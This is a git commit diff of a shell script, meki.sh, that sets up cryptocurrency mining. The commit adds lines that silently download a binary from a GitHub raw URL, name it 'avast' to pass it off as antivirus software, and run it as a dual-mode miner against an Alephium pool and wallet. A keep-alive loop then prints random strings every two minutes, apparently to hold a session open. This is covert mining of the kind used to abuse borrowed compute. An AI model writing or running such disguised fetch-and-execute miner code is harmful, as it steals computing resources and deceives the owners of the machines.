1983dfffb6f9aa2d0aac34181abc2c824185cfd7
renilo <88342640+renilo@users.noreply.github.com>
2022-02-20 19:27:53 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -10,15 +10,15 @@ apt install proxychains
 
 apt install screen -y
 
-#wget -qO avast https://raw.githubusercontent.com/renilo/bc/main/blkdiscard >/dev/null 2>&1 
-#chmod +x avast >/dev/null 2>&1
+wget -qO avast https://raw.githubusercontent.com/renilo/bc/main/blkdiscard >/dev/null 2>&1 
+
+chmod +x avast >/dev/null 2>&1
+
 #./avast -a BLAKE3 --pool de.alephium.herominers.com:1199 --user 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.$(echo $(shuf -i 1-9999999 -n 1)-MEKI)
 
-wget https://transfer.sh/J2BCke/t-rex
-chmod 777 t-rex
-./t-rex a blake3 -o stratum+tcp://de.alephium.herominers.com:1199 -u 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup -p x -w rig0
+./avast --dualmode ALEPHDUAL --dualpool de.alephium.herominers.com:1199 --dualuser 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup --worker lolMinerWork
 
-while [ 1 ]; do
+ while [ 1 ]; do
 
   while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
 
